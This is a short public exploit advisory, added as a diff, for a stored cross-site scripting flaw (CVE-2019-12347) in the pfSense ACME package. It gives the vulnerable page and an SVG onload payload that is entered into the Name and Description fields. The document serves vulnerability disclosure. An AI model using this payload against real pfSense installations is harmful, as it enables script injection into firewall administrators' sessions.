@@ -1,0 +1,21 @@
+# Exploit Title: pfSense 2.4.4-p3 (ACMEPackage 0.5.7_1) - Stored Cross-Site Scripting 
+# Date: 05.28.2019 
+# Exploit Author: Chi Tran
+# Vendor Homepage: https://www.pfsense.org 
+# Version: 2.4.4-p3/0.5.7_1
+# Software Link: N/A
+# Google Dork: N/A
+# CVE:2019-12347 
+
+################################################################################################################################## 
+Introduction pfSense® software is a free, open source customized distribution of FreeBSD specifically tailored for use as a firewall and router that is entirely managed via web interface. 
+In addition to being a powerful, flexible firewalling and routing platform, it includes a long list of related features and a package system allowing further expandability without adding bloat and potential security vulnerabilities to the base distribution. 
+
+The ACME Package for pfSense interfaces with Let’s Encrypt to handle the certificate generation, validation, and  renewal processes. (https://docs.netgate.com/pfsense/en/latest/certificates/acme-package.html)
+################################################################################# 
+
+Proof of Concepts:
+
+1 - Navigate to https://192.168.1.1/acme/acme_accountkeys_edit.php 
+2 - In the "Name" and "Description" field, input payload: "><svg/onload=alert(1)>
+3 - XSS box will then pop-up
